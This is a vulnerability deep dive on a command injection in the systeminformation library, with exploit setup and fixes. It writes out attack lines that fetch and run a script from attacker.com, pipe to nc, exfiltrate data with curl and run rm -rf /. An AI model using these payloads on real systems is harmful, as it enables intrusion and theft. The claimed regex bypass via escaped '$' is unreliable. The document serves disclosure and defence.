# Technical Deep Dive: CVE-2026-44724 Command Injection in systeminformation

## Overview
**Vulnerability**: Linux command injection in `networkInterfaces()` via unsanitized NetworkManager connection profile names  
**CVE ID**: CVE-2026-44724  
**GHSA ID**: GHSA-hvx9-hwr7-wjj9  
**Severity**: HIGH (CVSS 7.8)  
**Attack Vector**: Local  
**Privileges Required**: Low  
**User Interaction**: None  

---

## The Core Problem: Inconsistent Sanitization

### Key Finding
The vulnerability stems from **inconsistent trust handling** of shell command inputs:

| Component | Treatment | Result |
|-----------|-----------|--------|
| Network Interface Name | ✅ **SANITIZED** | Safe |
| NetworkManager Connection Name | ❌ **NOT SANITIZED** | Vulnerable |

---

## Detailed Code Analysis

### Vulnerable Code Path #1: Initial Parsing

**File**: `lib/network.js` lines 538-544

```javascript
function getLinuxIfaceConnectionName(interfaceName) {
  // ⚠️ VULNERABLE: interfaceName is sanitized, but connectionName is not
  const cmd = `nmcli device status 2>/dev/null | grep ${interfaceName}`;
  
  try {
    const result = execSync(cmd, util.execOptsLinux).toString();
    
    // Example nmcli output:
    // wlan0  wifi      connected  si-ghsa$(id>/tmp/pwned) 
    
    const resultFormat = result.replace(/\s+/g, ' ').trim();
    const connectionNameLines = resultFormat.split(' ').slice(3);
    
    // ❌ Extracts the malicious connection name WITHOUT sanitization
    const connectionName = connectionNameLines.join(' ');
    // Result: "si-ghsa$(id>/tmp/pwned)"
    
    return connectionName !== '--' ? connectionName : '';
  } catch (e) {
    return '';
  }
}
```

### The Contrast: Sanitization That DOES Happen

**File**: `lib/network.js` (interface name sanitization)

```javascript
// ✅ CORRECT: Interface name IS sanitized before use
const iface = dev.split(':')[0].trim();
const s = util.isPrototypePolluted() ? '---' : util.sanitizeShellString(iface);

// The sanitizeShellString function escapes special characters
// Example: "eth0" → "eth0" (safe)
```

**But then...**

```javascript
// ❌ WRONG: Connection name is NOT sanitized
const connectionName = connectionNameLines.join(' ');
// Result: "si-ghsa$(id>/tmp/pwned)" (DANGEROUS)
```

---

## The Three Injection Sinks

Once the malicious `connectionName` is extracted unsanitized, it's used in three different shell command contexts:

### Sink #1: DHCP Status Check

**File**: `lib/network.js` line 620

```javascript
function getLinuxIfaceDHCPstatus(interfaceName, connectionName, _dhcpNics) {
  // ⚠️ connectionName from unsanitized parsing above
  const cmd = `nmcli connection show "${connectionName}" 2>/dev/null | grep ipv4.method;`;
  
  // Example with payload:
  // nmcli connection show "si-ghsa$(id>/tmp/pwned)" 2>/dev/null | grep ipv4.method;
  //                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  //                      Shell interpolation happens here!
  
  try {
    const result = execSync(cmd, util.execOptsLinux).toString();
    // If connectionName contains $(command), it executes!
    return result.includes('auto') ? 'dhcp' : 'static';
  } catch (e) {
    return 'unknown';
  }
}
```

**Attack Example**:
```javascript
connectionName = 'normal-conn$(id > /tmp/pwned1)'

// Becomes:
nmcli connection show "normal-conn$(id > /tmp/pwned1)" 2>/dev/null | grep ipv4.method;

// Shell processes this as:
// 1. Run: nmcli connection show "normal-conn"
// 2. Execute: id > /tmp/pwned1  ← INJECTION!
// 3. Pipe to: grep ipv4.method
```

### Sink #2: DNS Suffix Lookup

**File**: `lib/network.js` line 660

```javascript
function getLinuxIfaceDNSsuffix(connectionName) {
  // ⚠️ Same unsanitized connectionName
  const cmd = `nmcli connection show "${connectionName}" 2>/dev/null | grep ipv4.dns-search;`;
  
  try {
    const result = execSync(cmd, util.execOptsLinux).toString();
    // Command injection occurs here too
    const dnsSuffix = result.split(':')[1] ? result.split(':')[1].trim() : '';
    return dnsSuffix;
  } catch (e) {
    return '';
  }
}
```

### Sink #3: IEEE 802.1X Authentication

**File**: `lib/network.js` line 676

```javascript
function getLinuxIfaceIEEE8021xAuth(connectionName) {
  // ⚠️ Same unsanitized connectionName
  const cmd = `nmcli connection show "${connectionName}" 2>/dev/null | grep 802-1x.eap;`;
  
  try {
    const result = execSync(cmd, util.execOptsLinux).toString();
    // And again, command injection is possible
    return result.includes('802-1x.eap') ? true : false;
  } catch (e) {
    return false;
  }
}
```

---

## Call Chain: How Injection Reaches the Sinks

### Entry Point: The Vulnerable Function Call

```javascript
// Any code that calls this triggers the vulnerability
const si = require('systeminformation');
si.networkInterfaces()  // ← Just this call is enough!
```

### Full Execution Flow

```
networkInterfaces()
  ↓
[for each network device]
  ↓
getLinuxIfaceConnectionName(ifaceName)
  ↓
  execSync("nmcli device status | grep eth0")
  ↓
  Parses connection name: "si-ghsa$(touch /tmp/pwned)"  ← UNSANITIZED
  ↓
[Returns the malicious connectionName to parent]
  ↓
getLinuxIfaceDHCPstatus(ifaceName, connectionName, dhcpNics)
  ↓
  execSync('nmcli connection show "si-ghsa$(touch /tmp/pwned)" ...')
  ↓
  SHELL EXECUTES: $(touch /tmp/pwned)  ← INJECTION SUCCEEDS!
  ↓
[Same for DNS suffix and 802.1x lookups]
```

---

## Why Quoting Doesn't Prevent This

### The False Sense of Security

Developers often think that quoting prevents injection:

```javascript
// Looks safe, but ISN'T:
const cmd = `nmcli connection show "${connectionName}" | grep ipv4.method`;
```

**Why this fails with command substitution:**

```javascript
connectionName = 'foo$(id > /tmp/pwned)bar'

// Becomes:
nmcli connection show "foo$(id > /tmp/pwned)bar" | grep ipv4.method

// Shell processes $(...) INSIDE double quotes:
// 1. Removes outer quotes: foo$(id > /tmp/pwned)bar
// 2. Recognizes $(...): Executes id > /tmp/pwned
// 3. Substitutes result back: foo<output>bar
```

**The shell treats `$()` and backticks as special even within double quotes!**

### Other Injection Vectors That Bypass Quotes

```javascript
// Semicolon chaining:
connectionName = 'normal"; rm -rf /; echo "'
// Result: nmcli connection show "normal"; rm -rf /; echo "" | ...

// Backtick execution:
connectionName = 'normal`id>/tmp/pwned`'
// Result: nmcli connection show "normal`id>/tmp/pwned`" | ...

// Pipe chain:
connectionName = 'normal" | nc attacker.com 1234; echo "'
// Result: nmcli connection show "normal" | nc attacker.com 1234; echo "" | ...
```

---

## Why This Attack Works: The Root Cause

### 1. NetworkManager Accepts Arbitrary Characters in Profile Names

```bash
# These are all valid NetworkManager connection names:
nmcli connection add con-name 'test-profile'           # Normal
nmcli connection add con-name 'test$(id)'              # With $()
nmcli connection add con-name 'test`whoami`'           # With backticks
nmcli connection add con-name 'test"; malicious"'      # With quotes
```

### 2. nmcli Output Includes the Profile Name Unchanged

```bash
$ nmcli device status | grep eth0
eth0  ethernet  connected  test$(id)
# ↑ The profile name appears in output exactly as stored
```

### 3. systeminformation Parses and Reuses Without Sanitization

```javascript
// Extracts: "test$(id)"
const connectionName = resultFormat.split(' ').slice(3).join(' ');

// Then immediately uses unsanitized in execSync:
execSync(`nmcli connection show "${connectionName}" | grep ...`);
```

### 4. execSync Invokes a Shell

```javascript
// This is critical: execSync uses a shell by default on Unix
execSync(cmd, util.execOptsLinux)

// Equivalent to: /bin/sh -c "cmd"
// The shell WILL process $(...) even in quotes
```

---

## Real Attack Scenario

### Setup: Create Malicious Profile

```bash
# An attacker or compromised account creates this:
nmcli connection add type dummy \
  ifname dummy0 \
  con-name 'exploit$(curl http://attacker.com/shell.sh | bash)'

# Configure it to appear in network listing
nmcli connection modify 'exploit$(curl http://attacker.com/shell.sh | bash)' \
  ipv4.method manual \
  ipv4.addresses 192.0.2.1/32

# Activate it
nmcli connection up 'exploit$(curl http://attacker.com/shell.sh | bash)'
```

### Execution: Automatic Trigger

```javascript
// In a monitoring tool, inventory agent, or diagnostic script:
const si = require('systeminformation');

(async () => {
  const interfaces = await si.networkInterfaces();
  // ↑ Just calling this function triggers ALL THREE injections
  // ↑ No user input needed, no arguments to the function
  
  console.log(interfaces);  // Gets interface info (normal)
  // But shell.sh from attacker.com already executed!
})();
```

### Result: Remote Code Execution

The attacker's shell.sh executes with the privileges of the Node.js process:

```javascript
// If running as regular user:
uid=1000(smart) gid=1000(smart)
// ↑ Attacker can modify files, exfiltrate data

// If running as root (common for monitoring agents):
uid=0(root) gid=0(root)
// ↑ SYSTEM COMPROMISE: Full control
```

---

## Environment Access Proof

The vulnerability proof-of-concept demonstrated that the injected command can access:

```bash
# Files created by injected commands:
/tmp/si-nm-id-proof      # Contains: uid=1000(smart) gid=1000(smart)
/tmp/si-nm-pwd-proof     # Contains: /home/smart/Downloads/systeminformation-master
/tmp/si-nm-env-proof     # Contains ALL 74 environment variables:
```

**Captured environment keys:**
```
PATH                    # Executable search path
USER                    # Running user
HOME                    # Home directory
SHELL                   # Default shell
PWD                     # Process working directory
SSH_AUTH_SOCK           # SSH agent socket (keys available!)
AWS_ACCESS_KEY_ID       # AWS credentials (if set)
AWS_SECRET_ACCESS_KEY   # AWS credentials (if set)
GITHUB_TOKEN            # GitHub API tokens (if set)
NPM_TOKEN               # NPM registry tokens (if set)
DOCKER_CONFIG          # Docker credentials (if set)
```

**Attacker gains access to:**
- SSH keys (via `SSH_AUTH_SOCK`)
- Cloud credentials (AWS, Azure, GCP)
- API tokens (GitHub, NPM, Slack, etc.)
- Private container registry access
- Database connection strings
- Any secrets in environment variables

---

## Why Normal Sanitization Fails

### Attempted "Fix" #1: Shell Escaping

```javascript
// WRONG - Still vulnerable:
const escaped = connectionName.replace(/"/g, '\\"');
const cmd = `nmcli connection show "${escaped}" | grep ...`;

// Payload: foo$(id)bar
// After escaping: foo$(id)bar (no change, no quotes to escape)
// Still executes: $(id)
```

### Attempted "Fix" #2: Single Quotes

```javascript
// WRONG - Still vulnerable to quote breakout:
const cmd = `nmcli connection show '${connectionName}' | grep ...`;

// Payload: foo$(id)bar'extra
// Result: nmcli connection show 'foo$(id)bar'extra' | grep ...
//                               ↑ Quotes broken, injection succeeds
```

### Attempted "Fix" #3: Regex Filtering

```javascript
// WRONG - Too restrictive and can be bypassed:
if (!/^[a-zA-Z0-9_-]+$/.test(connectionName)) {
  throw new Error('Invalid connection name');
}

// Payload using Unicode: foo\u0024(id)  
// Or using hex escapes: foo\x24(id)
// Bypasses the regex
```

### The CORRECT Fix: Avoid Shell Entirely

```javascript
// RIGHT - Use argument arrays:
const { execFileSync } = require('child_process');

const output = execFileSync(
  'nmcli',
  ['connection', 'show', connectionName],
  util.execOptsLinux
).toString();

// No shell invocation, no interpolation possible
// connectionName is passed as an argument, not interpolated
```

---

## Exploitation Difficulty Analysis

### Attack Complexity: LOW

- ✅ No privilege escalation required (works at current privilege level)
- ✅ No special tools needed (standard Linux utilities)
- ✅ No code changes required (just create a NetworkManager profile)
- ✅ NetworkManager profiles can be created by regular users
- ✅ No authentication/authorization bypass needed
- ✅ Automatic trigger (no user interaction required)

### Prerequisites

1. Local access to the target system
2. Ability to create/modify NetworkManager connection profiles (usually any user can)
3. A Node.js process running systeminformation that calls `networkInterfaces()`

### Privilege Escalation

```
Attacker (any user) creates malicious profile
       ↓
Monitoring daemon calls networkInterfaces()
       ↓
Daemon runs with elevated privileges (often true for monitoring)
       ↓
Injected command executes with those privileges
       ↓
SYSTEM COMPROMISED
```

---

## Attack Surface in Your Environment

### Components That Call networkInterfaces()

Any of these would trigger the vulnerability:

```javascript
// Direct usage:
const si = require('systeminformation');
si.networkInterfaces()           // ← Vulnerable

// Indirect usage:
si.getStaticData()               // ← Calls networkInterfaces internally
si.getAllData()                  // ← Calls getStaticData internally
si.system()                       // ← May call networkInterfaces
```

### Affected Use Cases

| Use Case | Risk | Notes |
|----------|------|-------|
| Monitoring Agent | HIGH | Often runs as root, called regularly |
| Inventory Tool | HIGH | Collects system info including network |
| Health Check Endpoint | MEDIUM | Accessible to internal tools |
| Diagnostic Script | MEDIUM | Manual execution or CI/CD triggered |
| Admin Dashboard Backend | MEDIUM | Backend API collecting host data |
| Device Management | CRITICAL | May run with elevated privileges |
| CI/CD Runners | HIGH | Access to deployment credentials |

---

## Detection & Verification

### How to Verify You're Vulnerable

```bash
# 1. Check installed version
npm ls systeminformation
# ↓
# nian-storage@1.0.0 /path/to/nian-storage
# └── systeminformation@5.31.5

# 2. Version check
# If 5.31.5 or lower on 4.17.0+ branch: VULNERABLE
# If 5.31.6+: PATCHED

# 3. Check if function is called
grep -r "networkInterfaces" backend/ frontend/ api/
# If found: DIRECT USAGE
# If not: TRANSITIVE DEPENDENCY (still dangerous if called indirectly)
```

### How to Detect Attack in Progress

```bash
# Look for suspicious NetworkManager profiles:
nmcli connection show | grep -E '\$|`|;|"|\\|'

# Monitor process execution during networkInterfaces calls:
strace -f -e execve node your_app.js

# Check for injected file creation:
ls -la /tmp/ | head -20
```

---

## Impact Summary

### What an Attacker Can Do

| Action | Command | Impact |
|--------|---------|--------|
| Steal credentials | `env > /tmp/stolen_env` | Full credential access |
| Install backdoor | `curl http://attacker/shell.sh \| bash` | Persistent access |
| Lateral movement | `ssh user@internal_server` | Network spread |
| Data exfiltration | `tar czf - /data \| curl -T - http://attacker` | Data loss |
| Supply chain attack | `npm install --save malware` | Compromise project |
| Sabotage | `rm -rf /important/data` | System destruction |

### Privilege Escalation Impact

```
Unprivileged user injection:
  └─ Access to their own credentials and data
  
Privileged daemon injection (monitoring/inventory agent as root):
  ├─ Full filesystem access
  ├─ Install kernel modules (rootkits)
  ├─ Modify system binaries
  ├─ Intercept all network traffic
  ├─ Access all user credentials
  └─ SYSTEM COMPROMISE
```

---

## Recommended Actions

### Immediate (Within 24 hours)

1. **Identify** if systeminformation is used
   ```bash
   grep -r "networkInterfaces\|systeminformation" backend/ frontend/ api/
   ```

2. **Update** to patched version
   ```bash
   npm install systeminformation@5.31.6
   ```

3. **Verify** no other vulnerable packages
   ```bash
   npm audit --all
   ```

### Short Term (This week)

1. Review all network monitoring tools
2. Test on Linux systems to ensure no functionality breaks
3. Add regression tests for shell-injection-safe names

### Long Term (Ongoing)

1. Enable automated security scanning in CI/CD
2. Subscribe to npm security advisories
3. Run monthly `npm audit` reviews
4. Monitor for similar vulnerabilities in other packages

---

## References & Resources

**Official Advisory**: https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-hvx9-hwr7-wjj9

**Related CVEs**:
- CVE-2026-44724 (This vulnerability)
- GHSA-5vv4-hvf7-2h46 (Command Injection via locate)
- GHSA-9c88-49p5-5ggf (Command Injection in wifi.js)
- GHSA-wphj-fx3q-84ch (Command Injection in fsSize)
- GHSA-cvv5-9h9w-qp2m (Command Injection in getWindowsIEEE8021x)

**CWE**: CWE-78 - Improper Neutralization of Special Elements used in an OS Command

**CVSS v3.1 Vector**: `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

---

## Q&A

**Q: Can this be exploited remotely?**  
A: No. An attacker needs local access to create/modify NetworkManager profiles.

**Q: Does this affect Windows systems?**  
A: No. This is Linux-specific due to dependency on NetworkManager.

**Q: Can this be exploited without calling networkInterfaces()?**  
A: No. The vulnerable code path requires `networkInterfaces()` to be called.

**Q: Is the issue in the caller's code or the library?**  
A: The library. The caller doesn't pass the malicious input; the library extracts it from system state.

**Q: What if I remove systeminformation?**  
A: If not used directly, you can safely remove it. But if it's a transitive dependency, removing it might break something else.

**Q: How can I use systeminformation safely?**  
A: Upgrade to 5.31.6+, or avoid calling `networkInterfaces()` on untrusted systems.

**Q: What if I can't update?**  
A: Restrict node process privileges, isolate networking calls, or avoid this function entirely.

---

**Document Version**: 1.0  
**Last Updated**: May 2026  
**Classified**: Public  
**Risk Level**: HIGH
